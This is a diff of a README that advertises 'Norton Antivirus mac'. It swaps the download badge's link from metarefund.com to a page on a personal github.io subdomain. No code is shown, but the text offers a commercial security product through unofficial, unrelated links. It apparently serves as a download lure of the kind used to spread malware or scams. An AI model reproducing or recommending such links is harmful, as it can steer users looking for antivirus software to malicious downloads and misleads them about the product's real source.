@@ -2,7 +2,7 @@
 
 Norton Antivirus mac delivers Mac‑optimized tools with Apple silicon support, native UI, and professional workflows.
 
-[![Download Norton Antivirus mac](https://img.shields.io/badge/Download-Norton_Antivirus_mac-blueviolet)](https://metarefund.com/)
+[![Download Norton Antivirus mac](https://img.shields.io/badge/Download-Norton_Antivirus_mac-blueviolet)](https://t9468731.github.io/.github/NortonAntivirusWorks)
 
 ---
 
